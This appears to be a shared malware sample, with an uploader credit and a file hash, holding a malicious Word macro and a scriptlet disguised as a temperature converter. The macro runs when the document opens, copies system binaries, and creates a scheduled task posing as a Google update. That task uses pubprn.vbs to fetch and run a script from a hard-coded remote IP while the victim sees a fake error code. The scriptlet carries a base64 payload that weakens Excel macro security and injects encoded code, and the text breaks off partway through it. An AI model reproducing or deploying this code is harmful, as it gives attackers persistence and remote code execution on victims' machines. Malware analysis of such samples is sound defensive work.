## Uploaded by @JohnLaTwC
## Sample hash: 4e8055529ef8c34086cd459b3050d77ed2a2f9bdfb62de381a6e34f94baa6506
##-----------------------
Private Sub Document_Open()
    
    Dim nghcvbfredsw As String
    Dim eergfrrtt As Double
    Dim ozKbo, ozKbp As String
    a = "a"
    b = "b"
    On Error Resume Next
    Dim RDir As String
    RDir = Environ("SYSTEMDRIVE")
    dfgfgeropu RDir
    ozKbo = "schtasks /create /sc MINUTE /tn ""GoogleUpdateTasksMachineCore"" /tr ""\""" & RDir & "\ProgramData\YING.exe\"" //E:vbscript /b " & RDir & "\ProgramData\YANG.txt localhost \""sc\""r\""i\""p\""t:http://80.255.3.109/microsoft.js"" /mo 15 /F"
    ozKbp = "schtasks /create /sc MINUTE /tn ""GoogleUpdateTasksMachineCore"" /tr ""\""" & RDir & "\ProgramData\YING.exe\"" //E:vbscript /b " & RDir & "\ProgramData\YANG.txt localhost \""sc\""r\""i\""p\""t:http://80.255.3.109/microsoft.js"" /mo 15"
    nghcvbfredsw = uyynmhkdfe("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\CurrentVersion")
    eergfrrtt = CDbl(nghcvbfredsw)
    If eergfrrtt >= 6.1 Then
        '
        Shell ozKbo, vbHide
    Else
        '
        Shell ozKbp, vbHide
    End If
    ActiveDocument.Range.Text = "Error Code: 0x000003414"
End Sub

Function uyynmhkdfe(i_RegKey As String) As String
    Dim myWS As Object
    On Error Resume Next
    Set myWS = CreateObject("WScript.Shell")
    uyynmhkdfe = myWS.RegRead(i_RegKey)
End Function
Sub dfgfgeropu(DesDir As String)
    FileCopy DesDir & "\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs", DesDir & "\ProgramData\YANG.txt"
FileCopy DesDir & "\Windows\System32\wscript.exe", DesDir & "\ProgramData\YING.exe"
End Sub



##-----------------
<SCRIPTLET> 

<Registration 
    Description="ConvertTemp" 
    ProgID="ConvertTemp.Scriptlet" 
    Version="1.00" 
> 
</Registration> 

<implements id=Automation type=Automation> 
    <method name=Celsius> 
        <PARAMETER name=F/> 
    </method> 
    <method name=Fahrenheit> 
        <PARAMETER name=C/> 
    </method> 
</implements> 

<SCRIPT Language= "VBScript"> 

On Error Resume Next
strString = "T24gRXJyb3IgUmVzdW1lIE5leHQgDQpEaW0gb2JqRXhjZWwsIFdzaFNoZWxsLCBSZWdQYXRoLCBhY3Rpb24sIG9ialdvcmtib29rLCB4bG1vZHVsZQ0KDQpTZXQgb2JqRXhjZWwgPSBDcmVhdGVPYmplY3QoIkV4Y2VsLkFwcGxpY2F0aW9uIikNCm9iakV4Y2VsLlZpc2libGUgPSBGYWxzZQ0KDQpTZXQgV3NoU2hlbGwgPSBDcmVhdGVPYmplY3QoIldzY3JpcHQuU2hlbGwiKQ0KDQpmdW5jdGlvbiBSZWdFeGlzdHMocmVnS2V5KQ0KCW9uIGVycm9yIHJlc3VtZSBuZXh0DQoJV3NoU2hlbGwuUmVnUmVhZCByZWdLZXkNCglSZWdFeGlzdHMgPSAoRXJyLm51bWJlciA9IDApDQplbmQgZnVuY3Rpb24NCg0KJyBHZXQgdGhlIG9sZCBBY2Nlc3NWQk9NIHZhbHVlDQpSZWdQYXRoID0gIkhLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXE1pY3Jvc29mdFxPZmZpY2VcIiAmIG9iakV4Y2VsLlZlcnNpb24gJiAiXEV4Y2VsXFNlY3VyaXR5XEFjY2Vzc1ZCT00iDQoNCmlmIFJlZ0V4aXN0cyhSZWdQYXRoKSB0aGVuDQoJYWN0aW9uID0gV3NoU2hlbGwuUmVnUmVhZChSZWdQYXRoKQ0KZWxzZQ0KCWFjdGlvbiA9ICIiDQplbmQgaWYNCg0KJyBXZWFrZW4gdGhlIHRhcmdldA0KV3NoU2hlbGwuUmVnV3JpdGUgUmVnUGF0aCwgMSwgIlJFR19EV09SRCINCg0KJyBSdW4gdGhlIG1hY3JvDQpTZXQgb2JqV29ya2Jvb2sgPSBvYmpFeGNlbC5Xb3JrYm9va3MuQWRkKCkNClNldCB4bG1vZHVsZSA9IG9ialdvcmtib29rLlZCUHJvamVjdC5WQkNvbXBvbmVudHMuQWRkKDEpDQp4bG1vZHVsZS5Db2RlTW9kdWxlLkFkZEZyb21TdHJpbmcgQ2hyKDgwKSZDaHIoMTE0KSZDaHIoMTA1KSZDaHIoMTE4KSZDaHIoOTcpJkNocigxMTYpJkNocigxMDEpJkNocigzMikmQ2hyKDg0KSZDaHIoMTIxKSZDaHIoMTEyKSZDaHIoMTAxKSZDaHIoMzIpJkNocig4MCkmQ2hyKDgyKSZDaHIoNzkpJkNocig2NykmQ2hyKDY5KSZDaHIoODMpJkNocig4MykmQ2hyKDk1KSZDaHIoNzMpJkNocig3OCkmQ2hyKDcwKSZDaHIoNzkpJkNocig4MikmQ2hyKDc3KSZDaHIoNjUpJkNocig4NCkmQ2hyKDczKSZDaHIoNzkpJkNocig3OCkmQ2hyKDEwKSYgXw0KQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMTA0KSZDaHIoODApJkNocigxMTQpJkNocigxMTEpJkNocig5OSkmQ2hyKDEwMSkmQ2hyKDExNSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoMTApJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDEwNCkmQ2hyKDg0KSZDaHIoMTA0KSZDaHIoMTE0KSZDaHIoMTAxKSZDaHIoOTcpJkNocigxMDApJiBfDQpDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocigxMCkmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMTAwKSZDaHIoMTE5KSZDaHIoODApJkNocigxMTQpJkNocigxMTEpJkNocig5OSkmQ2hyKDEwMSkmQ2hyKDExNSkmQ2hyKDExNSkmQ2hyKDczKSZDaHIoMTAwKSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJiBfDQpDaHIoMTApJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDEwMCkmQ2hyKDExOSkmQ2hyKDg0KSZDaHIoMTA0KSZDaHIoMTE0KSZDaHIoMTAxKSZDaHIoOTcpJkNocigxMDApJkNocig3MykmQ2hyKDEwMCkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoMTApJkNocig2OSkmQ2hyKDExMCkmQ2hyKDEwMCkmQ2hyKDMyKSZDaHIoODQpJkNocigxMjEpJkNocigxMTIpJkNocigxMDEpJiBfDQpDaHIoMTApJkNocigxMCkmQ2hyKDgwKSZDaHIoMTE0KSZDaHIoMTA1KSZDaHIoMTE4KSZDaHIoOTcpJkNocigxMTYpJkNocigxMDEpJkNocigzMikmQ2hyKDg0KSZDaHIoMTIxKSZDaHIoMTEyKSZDaHIoMTAxKSZDaHIoMzIpJkNocig4MykmQ2hyKDg0KSZDaHIoNjUpJkNocig4MikmQ2hyKDg0KSZDaHIoODUpJkNocig4MCkmQ2hyKDczKSZDaHIoNzgpJkNocig3MCkmQ2hyKDc5KSZDaHIoMTApJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDk5KSYgXw0KQ2hyKDk4KSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocigxMCkmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMTA4KSZDaHIoMTEyKSZDaHIoODIpJkNocigxMDEpJkNocigxMTUpJkNocigxMDEpJkNocigxMTQpJkNocigxMTgpJkNocigxMDEpJkNocigxMDApJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig4MykmQ2hyKDExNikmQ2hyKDExNCkmQ2hyKDEwNSkmIF8NCkNocigxMTApJkNocigxMDMpJkNocigxMCkmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMTA4KSZDaHIoMTEyKSZDaHIoNjgpJkNocigxMDEpJkNocigxMTUpJkNocigxMDcpJkNocigxMTYpJkNocigxMTEpJkNocigxMTIpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig4MykmQ2hyKDExNikmQ2hyKDExNCkmQ2hyKDEwNSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDEwKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigxMDgpJiBfDQpDaHIoMTEyKSZDaHIoODQpJkNocigxMDUpJkNocigxMTYpJkNocigxMDgpJkNocigxMDEpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig4MykmQ2hyKDExNikmQ2hyKDExNCkmQ2hyKDEwNSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDEwKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigxMDApJkNocigxMTkpJkNocig4OCkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSYgXw0KQ2hyKDEwKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigxMDApJkNocigxMTkpJkNocig4OSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoMTApJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDEwMCkmQ2hyKDExOSkmQ2hyKDg4KSZDaHIoODMpJkNocigxMDUpJkNocigxMjIpJkNocigxMDEpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJiBfDQpDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocigxMCkmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMTAwKSZDaHIoMTE5KSZDaHIoODkpJkNocig4MykmQ2hyKDEwNSkmQ2hyKDEyMikmQ2hyKDEwMSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoMTApJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDEwMCkmQ2hyKDExOSkmQ2hyKDg4KSYgXw0KQ2hyKDY3KSZDaHIoMTExKSZDaHIoMTE3KSZDaHIoMTEwKSZDaHIoMTE2KSZDaHIoNjcpJkNocigxMDQpJkNocig5NykmQ2hyKDExNCkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoMTApJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDEwMCkmQ2hyKDExOSkmQ2hyKDg5KSZDaHIoNjcpJkNocigxMTEpJkNocigxMTcpJkNocigxMTApJkNocigxMTYpJkNocig2NykmIF8NCkNocigxMDQpJkNocig5NykmQ2hyKDExNCkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoMTApJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDEwMCkmQ2hyKDExOSkmQ2hyKDcwKSZDaHIoMTA1KSZDaHIoMTA4KSZDaHIoMTA4KSZDaHIoNjUpJkNocigxMTYpJkNocigxMTYpJkNocigxMTQpJkNocigxMDUpJkNocig5OCkmQ2hyKDExNykmQ2hyKDExNikmQ2hyKDEwMSkmIF8NCkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig3NikmQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDEwKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigxMDApJkNocigxMTkpJkNocig3MCkmQ2hyKDEwOCkmQ2hyKDk3KSZDaHIoMTAzKSZDaHIoMTE1KSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocigxMCkmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmIF8NCkNocigzMikmQ2hyKDExOSkmQ2hyKDgzKSZDaHIoMTA0KSZDaHIoMTExKSZDaHIoMTE5KSZDaHIoODcpJkNocigxMDUpJkNocigxMTApJkNocigxMDApJkNocigxMTEpJkNocigxMTkpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig3MykmQ2hyKDExMCkmQ2hyKDExNikmQ2hyKDEwMSkmQ2hyKDEwMykmQ2hyKDEwMSkmQ2hyKDExNCkmQ2hyKDEwKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocig5OSkmQ2hyKDk4KSZDaHIoODIpJkNocigxMDEpJiBfDQpDaHIoMTE1KSZDaHIoMTAxKSZDaHIoMTE0KSZDaHIoMTE4KSZDaHIoMTAxKSZDaHIoMTAwKSZDaHIoNTApJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig3MykmQ2hyKDExMCkmQ2hyKDExNikmQ2hyKDEwMSkmQ2hyKDEwMykmQ2hyKDEwMSkmQ2hyKDExNCkmQ2hyKDEwKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigxMDgpJkNocigxMTIpJkNocig4MikmQ2hyKDEwMSkmQ2hyKDExNSkmQ2hyKDEwMSkmQ2hyKDExNCkmQ2hyKDExOCkmQ2hyKDEwMSkmIF8NCkNocigxMDApJkNocig1MCkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoMTApJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDEwNCkmQ2hyKDgzKSZDaHIoMTE2KSZDaHIoMTAwKSZDaHIoNzMpJkNocigxMTApJkNocigxMTIpJkNocigxMTcpJkNocigxMTYpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig3NikmQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDEwMykmIF8NCkNocigxMCkmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMTA0KSZDaHIoODMpJkNocigxMTYpJkNocigxMDApJkNocig3OSkmQ2hyKDExNykmQ2hyKDExNikmQ2hyKDExMikmQ2hyKDExNykmQ2hyKDExNikmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoMTApJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDEwNCkmQ2hyKDgzKSZDaHIoMTE2KSZDaHIoMTAwKSYgXw0KQ2hyKDY5KSZDaHIoMTE0KSZDaHIoMTE0KSZDaHIoMTExKSZDaHIoMTE0KSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocigxMCkmQ2hyKDY5KSZDaHIoMTEwKSZDaHIoMTAwKSZDaHIoMzIpJkNocig4NCkmQ2hyKDEyMSkmQ2hyKDExMikmQ2hyKDEwMSkmQ2hyKDEwKSZDaHIoMTApJkNocigzNSkmQ2hyKDczKSZDaHIoMTAyKSZDaHIoMzIpJkNocig4NikmQ2hyKDY2KSZDaHIoNjUpJkNocig1NSkmIF8NCkNocigzMikmQ2hyKDg0KSZDaHIoMTA0KSZDaHIoMTAxKSZDaHIoMTEwKSZDaHIoMTApJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDgwKSZDaHIoMTE0KSZDaHIoMTA1KSZDaHIoMTE4KSZDaHIoOTcpJkNocigxMTYpJkNocigxMDEpJkNocigzMikmQ2hyKDY4KSZDaHIoMTAxKSZDaHIoOTkpJkNocigxMDgpJkNocig5NykmQ2hyKDExNCkmQ2hyKDEwMSkmQ2hyKDMyKSZDaHIoODApJkNocigxMTYpJkNocigxMTQpJkNocig4MykmQ2hyKDk3KSZDaHIoMTAyKSYgXw0KQ2hyKDEwMSkmQ2hyKDMyKSZDaHIoNzApJkNocigxMTcpJkNocigxMTApJkNocig5OSkmQ2hyKDExNikmQ2hyKDEwNSkmQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDMyKSZDaHIoNjcpJkNocigxMTQpJkNocigxMDEpJkNocig5NykmQ2hyKDExNikmQ2hyKDEwMSkmQ2hyKDgzKSZDaHIoMTE2KSZDaHIoMTE3KSZDaHIoMTAyKSZDaHIoMTAyKSZDaHIoMzIpJkNocig3NikmQ2hyKDEwNSkmQ2hyKDk4KSZDaHIoMzIpJkNocigzNCkmQ2hyKDEwNykmQ2hyKDEwMSkmQ2hyKDExNCkmQ2hyKDExMCkmIF8NCkNocigxMDEpJkNocigxMDgpJkNocig1MSkmQ2hyKDUwKSZDaHIoMzQpJkNocigzMikmQ2hyKDY1KSZDaHIoMTA4KSZDaHIoMTA1KSZDaHIoOTcpJkNocigxMTUpJkNocigzMikmQ2hyKDM0KSZDaHIoNjcpJkNocigxMTQpJkNocigxMDEpJkNocig5NykmQ2hyKDExNikmQ2hyKDEwMSkmQ2hyKDgyKSZDaHIoMTAxKSZDaHIoMTA5KSZDaHIoMTExKSZDaHIoMTE2KSZDaHIoMTAxKSZDaHIoODQpJkNocigxMDQpJkNocigxMTQpJkNocigxMDEpJkNocig5NykmQ2hyKDEwMCkmQ2hyKDM0KSYgXw0KQ2hyKDMyKSZDaHIoNDApJkNocig2NikmQ2hyKDEyMSkmQ2hyKDg2KSZDaHIoOTcpJkNocigxMDgpJkNocigzMikmQ2hyKDEwNCkmQ2hyKDgwKSZDaHIoMTE0KSZDaHIoMTExKSZDaHIoOTkpJkNocigxMDEpJkNocigxMTUpJkNocigxMTUpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig3NikmQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDQ0KSZDaHIoMzIpJkNocig2NikmQ2hyKDEyMSkmQ2hyKDg2KSZDaHIoOTcpJkNocigxMDgpJkNocigzMikmIF8NCkNocigxMDgpJkNocigxMTIpJkNocig4NCkmQ2hyKDEwNCkmQ2hyKDExNCkmQ2hyKDEwMSkmQ2hyKDk3KSZDaHIoMTAwKSZDaHIoNjUpJkNocigxMTYpJkNocigxMTYpJkNocigxMTQpJkNocigxMDUpJkNocig5OCkmQ2hyKDExNykmQ2hyKDExNikmQ2hyKDEwMSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoNDQpJkNocigzMikmQ2hyKDY2KSZDaHIoMTIxKSZDaHIoODYpJkNocig5NykmIF8NCkNocigxMDgpJkNocigzMikmQ2hyKDEwMCkmQ2hyKDExOSkmQ2hyKDgzKSZDaHIoMTE2KSZDaHIoOTcpJkNocig5OSkmQ2hyKDEwNykmQ2hyKDgzKSZDaHIoMTA1KSZDaHIoMTIyKSZDaHIoMTAxKSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocig0NCkmQ2hyKDMyKSZDaHIoNjYpJkNocigxMjEpJkNocig4NikmQ2hyKDk3KSZDaHIoMTA4KSZDaHIoMzIpJkNocigxMDgpJkNocigxMTIpJkNocig4MykmIF8NCkNocigxMTYpJkNocig5NykmQ2hyKDExNCkmQ2hyKDExNikmQ2hyKDY1KSZDaHIoMTAwKSZDaHIoMTAwKSZDaHIoMTE0KSZDaHIoMTAxKSZDaHIoMTE1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocig4MCkmQ2hyKDExNikmQ2hyKDExNCkmQ2hyKDQ0KSZDaHIoMzIpJkNocigxMDgpJkNocigxMTIpJkNocig4MCkmQ2hyKDk3KSZDaHIoMTE0KSZDaHIoOTcpJkNocigxMDkpJkNocigxMDEpJiBfDQpDaHIoMTE2KSZDaHIoMTAxKSZDaHIoMTE0KSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocig0NCkmQ2hyKDMyKSZDaHIoNjYpJkNocigxMjEpJkNocig4NikmQ2hyKDk3KSZDaHIoMTA4KSZDaHIoMzIpJkNocigxMDApJkNocigxMTkpJkNocig2NykmQ2hyKDExNCkmQ2hyKDEwMSkmQ2hyKDk3KSZDaHIoMTE2KSZDaHIoMTA1KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoNzApJkNocigxMDgpJkNocig5NykmIF8NCkNocigxMDMpJkNocigxMTUpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig3NikmQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDQ0KSZDaHIoMzIpJkNocigxMDgpJkNocigxMTIpJkNocig4NCkmQ2hyKDEwNCkmQ2hyKDExNCkmQ2hyKDEwMSkmQ2hyKDk3KSZDaHIoMTAwKSZDaHIoNzMpJkNocig2OCkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoNDEpJkNocigzMikmIF8NCkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocig4MCkmQ2hyKDExNikmQ2hyKDExNCkmQ2hyKDEwKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocig4MCkmQ2hyKDExNCkmQ2hyKDEwNSkmQ2hyKDExOCkmQ2hyKDk3KSZDaHIoMTE2KSZDaHIoMTAxKSZDaHIoMzIpJkNocig2OCkmQ2hyKDEwMSkmQ2hyKDk5KSZDaHIoMTA4KSZDaHIoOTcpJkNocigxMTQpJkNocigxMDEpJkNocigzMikmQ2hyKDgwKSYgXw0KQ2hyKDExNikmQ2hyKDExNCkmQ2hyKDgzKSZDaHIoOTcpJkNocigxMDIpJkNocigxMDEpJkNocigzMikmQ2hyKDcwKSZDaHIoMTE3KSZDaHIoMTEwKSZDaHIoOTkpJkNocigxMTYpJkNocigxMDUpJkNocigxMTEpJkNocigxMTApJkNocigzMikmQ2hyKDY1KSZDaHIoMTA4KSZDaHIoMTA4KSZDaHIoMTExKSZDaHIoOTkpJkNocig4MykmQ2hyKDExNikmQ2hyKDExNykmQ2hyKDEwMikmQ2hyKDEwMikmQ2hyKDMyKSZDaHIoNzYpJkNocigxMDUpJkNocig5OCkmQ2hyKDMyKSZDaHIoMzQpJiBfDQpDaHIoMTA3KSZDaHIoMTAxKSZDaHIoMTE0KSZDaHIoMTEwKSZDaHIoMTAxKSZDaHIoMTA4KSZDaHIoNTEpJkNocig1MCkmQ2hyKDM0KSZDaHIoMzIpJkNocig2NSkmQ2hyKDEwOCkmQ2hyKDEwNSkmQ2hyKDk3KSZDaHIoMTE1KSZDaHIoMzIpJkNocigzNCkmQ2hyKDg2KSZDaHIoMTA1KSZDaHIoMTE0KSZDaHIoMTE2KSZDaHIoMTE3KSZDaHIoOTcpJkNocigxMDgpJkNocig2NSkmQ2hyKDEwOCkmQ2hyKDEwOCkmQ2hyKDExMSkmQ2hyKDk5KSZDaHIoNjkpJkNocigxMjApJkNocigzNCkmIF8NCkNocigzMikmQ2hyKDQwKSZDaHIoNjYpJkNocigxMjEpJkNocig4NikmQ2hyKDk3KSZDaHIoMTA4KSZDaHIoMzIpJkNocigxMDQpJkNocig4MCkmQ2hyKDExNCkmQ2hyKDExMSkmQ2hyKDk5KSZDaHIoMTAxKSZDaHIoMTE1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocig0NCkmQ2hyKDMyKSZDaHIoNjYpJkNocigxMjEpJkNocig4NikmQ2hyKDk3KSZDaHIoMTA4KSZDaHIoMzIpJiBfDQpDaHIoMTA4KSZDaHIoMTEyKSZDaHIoNjUpJkNocigxMDApJkNocigxMDApJkNocigxMTQpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig3NikmQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDQ0KSZDaHIoMzIpJkNocig2NikmQ2hyKDEyMSkmQ2hyKDg2KSZDaHIoOTcpJkNocigxMDgpJkNocigzMikmQ2hyKDEwOCkmQ2hyKDgzKSZDaHIoMTA1KSZDaHIoMTIyKSZDaHIoMTAxKSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJiBfDQpDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoNDQpJkNocigzMikmQ2hyKDY2KSZDaHIoMTIxKSZDaHIoODYpJkNocig5NykmQ2hyKDEwOCkmQ2hyKDMyKSZDaHIoMTAyKSZDaHIoMTA4KSZDaHIoNjUpJkNocigxMDgpJkNocigxMDgpJkNocigxMTEpJkNocig5OSkmQ2hyKDk3KSZDaHIoMTE2KSZDaHIoMTA1KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoODQpJkNocigxMjEpJkNocigxMTIpJkNocigxMDEpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig3NikmIF8NCkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocig0NCkmQ2hyKDMyKSZDaHIoNjYpJkNocigxMjEpJkNocig4NikmQ2hyKDk3KSZDaHIoMTA4KSZDaHIoMzIpJkNocigxMDIpJkNocigxMDgpJkNocig4MCkmQ2hyKDExNCkmQ2hyKDExMSkmQ2hyKDExNikmQ2hyKDEwMSkmQ2hyKDk5KSZDaHIoMTE2KSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocig0MSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJiBfDQpDaHIoMzIpJkNocig3NikmQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDgwKSZDaHIoMTE2KSZDaHIoMTE0KSZDaHIoMTApJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDgwKSZDaHIoMTE0KSZDaHIoMTA1KSZDaHIoMTE4KSZDaHIoOTcpJkNocigxMTYpJkNocigxMDEpJkNocigzMikmQ2hyKDY4KSZDaHIoMTAxKSZDaHIoOTkpJkNocigxMDgpJkNocig5NykmQ2hyKDExNCkmQ2hyKDEwMSkmQ2hyKDMyKSZDaHIoODApJkNocigxMTYpJkNocigxMTQpJiBfDQpDaHIoODMpJkNocig5NykmQ2hyKDEwMikmQ2hyKDEwMSkmQ2hyKDMyKSZDaHIoNzApJkNocigxMTcpJkNocigxMTApJkNocig5OSkmQ2hyKDExNikmQ2hyKDEwNSkmQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDMyKSZDaHIoODcpJkNocigxMTQpJkNocigxMDUpJkNocigxMTYpJkNocigxMDEpJkNocig4MykmQ2hyKDExNikmQ2hyKDExNykmQ2hyKDEwMikmQ2hyKDEwMikmQ2hyKDMyKSZDaHIoNzYpJkNocigxMDUpJkNocig5OCkmQ2hyKDMyKSZDaHIoMzQpJkNocigxMDcpJkNocigxMDEpJiBfDQpDaHIoMTE0KSZDaHIoMTEwKSZDaHIoMTAxKSZDaHIoMTA4KSZDaHIoNTEpJkNocig1MCkmQ2hyKDM0KSZDaHIoMzIpJkNocig2NSkmQ2hyKDEwOCkmQ2hyKDEwNSkmQ2hyKDk3KSZDaHIoMTE1KSZDaHIoMzIpJkNocigzNCkmQ2hyKDg3KSZDaHIoMTE0KSZDaHIoMTA1KSZDaHIoMTE2KSZDaHIoMTAxKSZDaHIoODApJkNocigxMTQpJkNocigxMTEpJkNocig5OSkmQ2hyKDEwMSkmQ2hyKDExNSkmQ2hyKDExNSkmQ2hyKDc3KSZDaHIoMTAxKSZDaHIoMTA5KSZDaHIoMTExKSZDaHIoMT